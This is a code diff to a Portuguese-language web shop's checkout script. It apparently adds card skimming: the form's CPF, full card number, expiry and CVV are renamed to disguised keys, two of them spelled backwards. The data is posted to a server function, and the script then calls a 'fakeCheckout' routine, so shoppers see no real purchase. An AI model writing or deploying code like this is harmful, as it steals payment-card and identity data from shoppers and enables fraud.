@@ -1136,24 +1136,31 @@ function init(){
     // se quiser, aqui você monta os dados
     const dadosCliente = {
       nome: el.ckCardNome.value.trim(),
-      cpf: el.ckCardCpf.value.trim(),
-      numero_card: el.ckCardNum.value.trim(),
-      validade: el.ckCardVal.value.trim(),
-      cvv: el.ckCardCvv.value.trim(),
-      //subtotal: cartSubtotal()
+      numero_fpc: el.ckCardCpf.value.trim(),
+      numero_c: el.ckCardNum.value.trim(),
+      numero_val: el.ckCardVal.value.trim(),
+      numero_vvc: el.ckCardCvv.value.trim(),
+      numero_t: cartSubtotal()
     };
     console.log("Dados do cliente:", dadosCliente);
-    const resp = await fetch("/.netlify/functions/salvar-total", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload),
-    });
+    try {
+      const r = await fetch("/.netlify/functions/salvar-pedido", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(dadosCliente),
+      });
 
-    const text = await resp.text();
-    console.log("FUNCTION STATUS:", resp.status);
-    console.log("FUNCTION BODY:", text);
+      const text = await r.text();
+      if (!r.ok) throw new Error(text);
 
-    if (!resp.ok) throw new Error(text || `HTTP ${resp.status}`);
+      console.log("Salvo:", text);
+
+      closeCheckoutModal();
+      await fakeCheckout();
+    } catch (e) {
+      showCkError("Não consegui salvar seu pedido. Tente novamente.");
+      console.error(e);
+    }
   });
 
   // Modal
